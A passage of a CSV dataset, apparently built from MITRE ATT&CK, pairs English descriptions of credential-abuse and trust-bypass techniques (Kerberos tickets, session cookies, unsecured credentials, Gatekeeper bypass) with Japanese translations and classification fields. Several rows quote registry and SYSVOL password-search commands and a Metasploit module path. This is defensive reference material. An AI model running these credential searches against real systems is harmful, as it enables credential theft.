アクセス権限レベルに応じて、ユーザーのサービスチケットまたはチケットグラントチケット（TGT）を取得できる可能性があります。サービスチケットは特定のリソースへのアクセスを許可しますが、TGTはチケットグラントサービス（TGS）からサービスチケットを要求するために使用でき、ユーザーがアクセス権限を持つあらゆるリソースにアクセスできます。(引用元: ADSecurity AD Kerberos Attacks)(引用元: GentilKiwi Pass the Ticket) Kerberosを認証メカニズムとして使用し、特定のリソースおよびそのリソースをホストするシステム（例: SharePoint）へのアクセスチケットを生成するサービスに対しては、[シルバーチケット](https://attack.mitre.org/techniques/T1558/002)が取得可能です。(引用元: ADSecurity AD Kerberos Attacks) [ゴールデンチケット](https://attack.mitre.org/techniques/T1558/001) は、キー配布サービスアカウント KRBTGT アカウント NTLM ハッシュを使用してドメインに対して取得することができ、Active Directory 内のあらゆるアカウントの TGT 生成を可能にします。（引用元：キャンベル 2014） 敵は、盗んだパスワードハッシュや AES キーなど、他のユーザー情報を使用して有効な Kerberos チケットを作成することもあります。 たとえば、「ハッシュのオーバーパス」では、NTLM パスワードハッシュを使用してユーザーとして認証（つまり、[ハッシュのパス](https://attack.mitre.org/techniques/T1550/002)）すると同時に、そのパスワードハッシュを使用して有効な Kerberos チケットを作成します（引用元：Stealthbits Overpass-the-Hash）。,defense-evasion;lateral-movement,Windows,credential_abuse,boundary_crossing,authentication_system;user_interaction;network_connectivity;file_storage_access,specified,AD / Directory Server;Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0008,attack-pattern--7b211ac6-c815-4189-93a9-ab415deca926,2020-01-30T17:03:43.072Z,2025-04-15T19:58:43.927Z,,,,
T1550.004,T1550,Web Session Cookie,Webセッションクッキー,"Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie) Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform. There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)",攻撃者は盗んだセッションクッキーを使用して、Webアプリケーションやサービスに認証できます。この手法はセッションが既に認証済みであるため、一部の多要素認証プロトコルをバイパスします。（出典: Pass The Cookie）認証クッキーは、ユーザーがサービスに認証した後、クラウドベースのサービスを含むWebアプリケーションで一般的に使用されます。これにより、認証情報が渡される必要がなく、再認証が頻繁に行われる必要がなくなります。 クッキーは、ウェブアプリケーションが積極的に使用されていない場合でも、長期間有効であることが多い。クッキーが[Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)または[Web Cookies](https://attack.mitre.org/techniques/T1606/001)を通じて取得されると、 攻撃者はそのクッキーを自身が制御するブラウザにインポートし、セッションクッキーが有効な限り、そのユーザーとしてサイトやアプリケーションを利用できるようになります。サイトにログイン後、攻撃者は機密情報へのアクセス、メールの閲覧、被害者アカウントが許可されている操作の実行が可能となります。 セッションクッキーを標的とし、多要素認証システムを迂回するマルウェアの事例が確認されている。(引用元: Unit 42 Mac Crypto Cookies January 2019),defense-evasion;lateral-movement,SaaS;IaaS;Office Suite,credential_abuse,boundary_crossing,authentication_system;mfa_in_use;user_interaction;email_infrastructure;cloud_control_plane;logging_monitoring,specified,Identity / SaaS (IdP/SSO);Log / Monitoring Server;Mail / Collaboration;Management Console for GovCloud,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0008,attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0,2020-01-30T17:48:49.395Z,2025-04-15T19:59:05.730Z,,,,
T1552,,Unsecured Credentials,保護されていない認証情報,"Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)), or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).(Citation: Brining MimiKatz to Unix)",攻撃者は侵害されたシステムを調査し、不適切に保存された認証情報を発見・取得する可能性があります。これらの認証情報は、システム上の多くの場所に保存または置き忘れられる可能性があります。これには、平文ファイル（例：[Bash History](https://attack.mitre.org/techniques/T1552/003)）、オペレーティングシステムやアプリケーション固有のリポジトリ（例： [レジストリ内の認証情報](https://attack.mitre.org/techniques/T1552/002))、その他の特殊なファイル/アーティファクト（例：[秘密鍵](https://attack.mitre.org/techniques/T1552/004)）などです。（引用元: Brining MimiKatz to Unix）,credential-access,Windows;SaaS;IaaS;Linux;macOS;Containers;Network Devices;Office Suite;Identity Provider,credential_abuse,credential_gain,authentication_system;endpoint_execution;file_storage_access,specified,Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517,2020-02-04T12:47:23.631Z,2025-04-15T19:58:26.362Z,,,,
T1552.001,T1552,Credentials In Files,ファイル内の認証情報,"Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords. It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).(Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.(Citation: SRD GPP) In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)",攻撃者は、ローカルファイルシステムやリモートファイル共有をスキャンし、不適切に保存された認証情報を含むファイルを探索する可能性があります。これには、ユーザーが自身の認証情報を保存するために作成したファイル、グループで共有される認証情報ストア、システムやサービスのパスワードを含む設定ファイル、埋め込まれたパスワードを含むソースコード/バイナリファイルなどが含まれます。 [OS認証情報ダンプ](https://attack.mitre.org/techniques/T1003)により、バックアップや保存された仮想マシンからパスワードを抽出することが可能です。(出典: CG 2014) Windowsドメインコントローラーに保存されたグループポリシー設定からもパスワードを取得できる。(出典: SRD GPP) クラウド環境やコンテナ環境では、認証済みユーザーおよびサービスアカウントの認証情報がローカル設定ファイルや認証情報ファイルに保存されることが多い。(引用元: Unit 42 Hildegard Malware) コンテナログ内のデプロイコマンドのパラメータとしても発見される可能性がある。(引用元: Unit 42 Unsecured Docker Daemons) 場合によっては、これらのファイルを別のマシンにコピーして再利用したり、ファイルをコピーせずに内容を読み取って認証に使用したりできる。(引用元: Specter Ops - Cloud Credential Storage),credential-access,Windows;IaaS;Linux;macOS;Containers,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;endpoint_management;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,AD / Directory Server;Backup Server;Business Workstation;File Server;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc,2020-02-04T12:52:13.006Z,2025-04-15T19:58:47.301Z,,,,
T1552.002,T1552,Credentials in Registry,レジストリ内の認証情報,Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons. Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials) * Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code> * Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>,攻撃者は侵害されたシステム上で、不適切に保存された認証情報をレジストリから検索することがあります。Windowsレジストリはシステムや他のプログラムが使用する設定情報を格納します。攻撃者は他のプログラムやサービスで使用するために保存された認証情報やパスワードを探してレジストリを照会する可能性があります。 これらの認証情報は自動ログオンに使用される場合がある。パスワード情報に関連するレジストリキーを検索する例示コマンド： (引用元: Pentestlab Stored Credentials)* ローカルマシンハイブ: <code>reg query HKLM /f password /t REG_SZ /s</code>* 現在のユーザーハイブ: <code>reg query HKCU /f password /t REG_SZ /s</code>,credential-access,Windows,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580,2020-02-04T12:58:40.678Z,2025-04-15T19:58:20.405Z,,,,
T1552.003,T1552,Bash History,Bash履歴,"Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the ""history"" utility. Once a user logs out, the history is flushed to the user’s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)",攻撃者は侵害されたシステム上で、bashコマンド履歴から不適切に保存された認証情報を検索する可能性があります。bashは「history」ユーティリティにより、ユーザーがコマンドラインで入力したコマンドを記録します。ユーザーがログアウトすると、履歴はユーザーの<code>.bash_history</code>ファイルに書き込まれます。このファイルは全ユーザー共通で以下の場所に存在します：<code>~/.bash_history</code>。 通常、このファイルにはユーザーの直近500件のコマンドが記録されます。ユーザーはプログラムの引数としてコマンドラインにユーザー名やパスワードを入力することが多く、ログアウト時にこれらの情報がファイルに保存されます。攻撃者はこのファイルを調査し、潜在的な認証情報を悪用する可能性があります。（引用元：DA外部、OS X Way）,credential-access,Linux;macOS,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--8187bd2a-866f-4457-9009-86b0ddedffa3,2020-02-04T13:02:11.685Z,2025-04-15T21:52:49.389Z,,,,
T1552.004,T1552,Private Keys,秘密鍵,"Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia) When a device is registered to Entra ID, a device key and a transport key are generated and used to verify the device’s identity.(Citation: Microsoft Primary Refresh Token) An adversary with access to the device may be able to export the keys in order to impersonate the device.(Citation: AADInternals Azure AD Device Identities) On network devices, private keys may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) Some private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.","攻撃者は侵害されたシステム上で、不適切に保存された認証情報を求めて秘密鍵証明書ファイルを検索する可能性があります。秘密鍵と証明書は認証、暗号化/復号化、デジタル署名に使用されます。（出典: Wikipedia Public Key Crypto）一般的な鍵・証明書ファイルの拡張子には以下が含まれます：.key, .pgp, .gpg, .ppk, .p12, .pem, .pfx, .cer, .p7b, .asc。 攻撃者はまた、一般的な鍵ディレクトリ（例：Unix系システムではSSH鍵用の`~/.ssh`、Windowsでは`C:\Users\(ユーザー名)\.ssh`）を調査する可能性があります。攻撃者ツールは、侵害されたシステム上で暗号鍵や証明書に関連するファイル拡張子を検索することもあります。(引用元: Kaspersky Careto)(引用元: Palo Alto Prince of Persia) デバイスがEntra IDに登録されると、デバイスキーとトランスポートキーが生成され、デバイスの身元確認に使用されます。(引用元: Microsoft Primary Refresh Token) デバイスへのアクセス権を持つ攻撃者は、キーをエクスポートしてデバイスを偽装できる可能性があります。(引用元: AADInternals Azure AD Device Identities) ネットワークデバイスでは、`crypto pki export`などの[Network Device CLI](https://attack.mitre.org/techniques/T1059/008)コマンドにより秘密鍵がエクスポートされる可能性がある。(引用元: cisco_deploy_rsa_keys) 一部の秘密鍵は操作にパスワードまたはパスフレーズを必要とするため、攻撃者はキーロギングのために[入力キャプチャ](https://attack.mitre.org/techniques/T1056)を使用したり、オフラインでパスフレーズを[ブルートフォース攻撃](https://attack.mitre.org/techniques/T1110)で解読しようとする可能性があります。 これらの秘密鍵は、SSH などの [リモートサービス](https://attack.mitre.org/techniques/T1021) への認証や、電子メールなど収集した他のファイルの復号に使用される可能性があります。",credential-access,Linux;macOS;Windows;Network Devices,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;network_connectivity;email_infrastructure;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Mail / Collaboration;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf,2020-02-04T13:06:49.258Z,2025-04-15T19:58:35.201Z,,,,
T1552.005,T1552,Cloud Instance Metadata API,クラウドインスタンスメタデータAPI,"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data. Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019) If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018) The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.",攻撃者は、認証情報やその他の機密データを収集するためにクラウドインスタンスメタデータAPIへのアクセスを試みる可能性があります。ほとんどのクラウドサービスプロバイダーは、実行中の仮想インスタンスに提供されるサービスであるクラウドインスタンスメタデータAPIをサポートしており、アプリケーションが実行中の仮想インスタンスに関する情報にアクセスできるようにします。利用可能な情報には通常、名前、セキュリティグループ、および認証情報や追加の秘密を含む可能性のあるUserDataスクリプトなどの機密データを含む追加のメタデータが含まれます。 インスタンスメタデータAPIはアプリケーション管理を支援する便宜として提供され、インスタンスにアクセス可能な者なら誰でも利用できます。(引用元: AWS Instance Metadata API) クラウドメタデータAPIは少なくとも1件の重大な侵害事例で使用されています。(引用元: Krebs Capital One August 2019) 攻撃者が稼働中の仮想インスタンスに侵入している場合、追加リソースへのアクセス権を付与する認証情報を特定するため、インスタンスメタデータAPIを直接クエリする可能性があります。 さらに、攻撃者は公開Webプロキシのサーバーサイドリクエストフォージェリ（SSRF）脆弱性を悪用し、インスタンスメタデータAPIへのリクエストを通じて機密情報にアクセスする可能性があります（出典：RedLock Instance Metadata API 2018）。 クラウドサービスプロバイダー間の事実上の標準は、インスタンスメタデータ API を <code>http[:]//169.254.169.254</code> でホストすることです。,credential-access,IaaS,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Proxy / Gateway,subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3,2020-02-11T18:47:46.619Z,2025-04-15T22:02:45.218Z,,,,
T1552.006,T1552,Group Policy Preferences,グループ ポリシーの優先設定,"Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016) These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key) The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files: * Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code> * Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword) * gpprefdecrypt.py On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>",攻撃者は、グループ ポリシー プリファレンス (GPP) 内で保護されていない認証情報を見つけようとする可能性があります。 GPPは、管理者が認証情報を埋め込んだドメインポリシーを作成できるツールです。これらのポリシーにより、管理者はローカルアカウントを設定できます。(引用元: Microsoft GPP 2016) これらのグループポリシーはドメインコントローラーのSYSVOLに保存されます。これは、ドメインユーザーなら誰でもSYSVOL共有を閲覧し、公開されているAESキーを使用してパスワードを復号できることを意味します。(引用元: Microsoft GPP Key) 以下のツールやスクリプトを使用して、グループポリシー設定XMLファイルからパスワードファイルを収集・復号できます:* Metasploitのポストエクスプロイトモジュール: <code>post/windows/gather/credentials/gpp</code>* Get-GPPPassword(引用元: Obscuresecurity Get-GPPPassword) * gpprefdecrypt.pySYSVOL共有上で、攻撃者は以下のコマンドを使用して潜在的なGPP XMLファイルを列挙する可能性があります: <code>dir /s * .xml</code>,credential-access,Windows,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;endpoint_management;cloud_control_plane;file_storage_access,specified,AD / Directory Server;Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--8d7bd4f5-3a89-4453-9c82-2c8894d5655e,2020-02-11T18:43:06.253Z,2025-04-15T22:39:12.196Z,,,,
T1552.007,T1552,Container API,コンテナAPI,"Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.(Citation: Docker API)(Citation: Kubernetes API) An adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.(Citation: Unit 42 Unsecured Docker Daemons) An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components.",攻撃者はコンテナ環境内のAPIを介して認証情報を収集する可能性があります。Docker APIやKubernetes APIなどの環境内APIは、ユーザーがコンテナリソースやクラスターコンポーネントをリモート管理することを可能にします。(引用元: Docker API)(引用元: Kubernetes API) 攻撃者はDocker APIにアクセスし、環境内のクラウド、コンテナ、その他様々なリソースへの認証情報を含むログを収集する可能性があります。(引用元: Unit 42 Unsecured Docker Daemons) ポッドのサービスアカウントなどを通じて十分な権限を持つ攻撃者は、Kubernetes API を使用して Kubernetes API サーバーから認証情報を取得することも可能です。これらの認証情報には、Docker API 認証に必要な情報や Kubernetes クラスターコンポーネントのシークレットが含まれる場合があります。,credential-access,Containers,credential_abuse,credential_gain,authentication_system;user_interaction;network_connectivity;cloud_control_plane;logging_monitoring,specified,Log / Monitoring Server,subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--f8ef3a62-3f44-40a4-abca-761ab235c436,2021-03-31T14:01:52.321Z,2025-04-15T22:09:34.621Z,,,,
T1552.008,T1552,Chat Messages,チャットメッセージ,"Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels. Rather than accessing the stored chat logs (i.e., [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation (Citation: Slack Security Risks).",攻撃者は、ユーザー通信サービスに保存または通過する保護されていない認証情報を直接収集する可能性がある。認証情報は、電子メール、SlackやTeamsなどのチャットサービス、JiraやTrelloなどのコラボレーションツール、その他ユーザー通信をサポートするサービスなどのユーザーチャット通信アプリケーションで送信・保存される場合がある。ユーザーは、プライベートまたはパブリックな社内通信チャネルで、ユーザー名とパスワード、APIキー、認証トークンなど様々な形式の認証情報を共有する可能性がある。 攻撃者は、保存されたチャットログ（例：[Credentials In Files](https://attack.mitre.org/techniques/T1552/001)）にアクセスする代わりに、ユーザーエンドポイント上のサービス内、サービスをホストするサーバー経由、またはクラウドホスト型サービスの管理者ポータル経由で、これらのサービス内の認証情報に直接アクセスする可能性があります。 攻撃者はまた、Slackワークフローなどの統合ツールを侵害し、メッセージを自動的に検索してユーザー認証情報を抽出する可能性があります。これらの認証情報は、横方向の移動や特権昇格などの追跡活動に悪用される可能性があります（引用元: Slack Security Risks）。,credential-access,SaaS;Office Suite,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;network_connectivity;email_infrastructure;cloud_control_plane;file_storage_access;logging_monitoring,specified,File Server;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Mail / Collaboration;Management Console for GovCloud,subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--9664ad0e-789e-40ac-82e2-d7b17fbe8fb3,2023-03-14T14:38:03.673Z,2025-04-15T21:56:22.979Z,,,,
T1553,,Subvert Trust Controls,信頼制御の回避,"Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site. Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates)",攻撃者は、信頼できないアクティビティをユーザーに警告したり、信頼できないプログラムの実行を防止したりするセキュリティ制御を弱体化させる可能性があります。オペレーティングシステムやセキュリティ製品には、プログラムやウェブサイトにある程度の信頼性があることを識別するメカニズムが含まれている場合があります。 例としては、有効なコード署名証明書で署名されているため実行が許可されるプログラム、インターネットからのダウンロードにより属性が設定されているため警告を表示するプログラム、信頼できないサイトへの接続が試みられていることを示す通知などが挙げられる。攻撃者はこれらの信頼メカニズムを回避しようとする。攻撃者が使用する手法は、回避しようとする具体的なメカニズムによって異なる。 攻撃者は、これらの制御を回避するために、[ファイルおよびディレクトリの権限変更](https://attack.mitre.org/techniques/T1222)や[レジストリの改ざん](https://attack.mitre.org/techniques/T1112)を行う可能性があります。(引用: SpectorOps Subverting Trust 2017年9月)また、標的システム上で信頼を獲得するため、コード署名証明書の作成や窃取を行う場合もある。(引用: Securelist Digital Certificates)(引用: Symantec Digital Certificates),defense-evasion,Windows;macOS;Linux,config_policy_manipulation,stealth,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7,2020-02-05T14:54:07.588Z,2025-04-15T19:59:00.906Z,,,,
T1553.001,T1553,Gatekeeper Bypass,Gatekeeper バイパス,"Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation: TheEclecticLightCompany apple notarization ) Based on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions: 1. Checks extended attribute  EGatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.(Citation: OceanLotus for OS X)(Citation: 20 macOS Common Tools and Techniques) 2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers. 3. Code Signing  EGatekeeper checks for a valid code signature from an Apple Developer ID. 4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an “unauthorized app Eand the security policy will be modified. Adversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211)), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.(Citation: theevilbit gatekeeper bypass 2021)(Citation: Application Bundle Manipulation Brandon Dalton) Applications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",攻撃者は、ファイル属性を変更し、Gatekeeper の機能を回避して、ユーザープロンプトを回避し、信頼できないプログラムを実行する可能性があります。 Gatekeeperは、ホスト上で信頼されたアプリケーションのみが実行されることを保証するAppleのセキュリティモデルの層として機能する一連の技術である。GatekeeperはSnow Leopard（10.6、2009年）のファイル検疫機能の上に構築され、コード署名、セキュリティポリシー準拠、公証などを含むように発展してきた。Gatekeeperはまた、初めて実行されるアプリケーションと再開されるアプリケーションを異なる方法で扱う。(引用元: TheEclecticLightCompany Quarantine and the flag)(引用元: TheEclecticLightCompany apple notarization ) オプトイン方式に基づき、ファイルがダウンロードされると、ダウンロードを実行したアプリケーションによって`com.apple.quarantine`（検疫フラグとも呼ばれる）という拡張属性（xattr）がファイルに設定される場合があります。Launch Servicesはアプリケーションをサスペンド状態で起動します。 検疫フラグが設定された初回起動アプリケーションに対し、Gatekeeperは以下の機能を実施します：1. 拡張属性の確認  EGatekeeperは検疫フラグをチェックし、実行許可/拒否を求める警告プロンプトをユーザーに表示します。(引用: OceanLotus for OS X)(引用: 20 macOS Common Tools and Techniques) 2. システムポリシーの確認 - Gatekeeperはシステムセキュリティポリシーを確認し、App Storeからのみ、またはApp Storeと特定開発者からのアプリ実行を許可します。3. コード署名  EGatekeeperはApple Developer IDによる有効なコード署名を検証します。4. 公証 - `api.apple-cloudkit.com` APIを使用し、GatekeeperはAppleサーバーに接続して公証チケットを検証または取得し、チケットが失効していないことを確認します。ユーザーは公証を無効化でき、その結果「未承認アプリ」の実行プロンプトが表示され、セキュリティポリシーが変更されます。 攻撃者は、ロジックエラー（例：[防御回避のための悪用](https://attack.mitre.org/techniques/T1211)）、チェック対象外のファイルタイプ、外部ライブラリを通じて、Gatekeeperチェック内の1つまたは複数のセキュリティ制御を回避できます。 例えば、macOS 13 Ventura以前では、コード署名と公証チェックは初回起動時のみ実施されていたため、攻撃者はGatekeeperセキュリティチェックを回避するために、以前に開かれたアプリケーションに悪意のある実行可能ファイルを書き込むことが可能であった。（引用元: theevilbit gatekeeper bypass 2021）（引用元: アプリケーションバンドルの操作 Brandon Dalton) USBフラッシュドライブ、光学ディスク、外付けハードドライブ、ローカルネットワーク経由で共有されたドライブ、またはcurlコマンドを使用してシステムにロードされたアプリケーションやファイルは、検疫フラグが設定されない可能性があります。さらに、[ドライブバイ侵害](https://attack.mitre.org/techniques/T1189)を使用して検疫フラグの設定を回避することも可能です。,defense-evasion,macOS,script_command_execution,stealth,user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--31a0a2ac-c67c-4a7e-b9ed-6a96477d4e8e,2020-02-05T16:16:08.471Z,2025-04-16T20:37:16.087Z,,,,
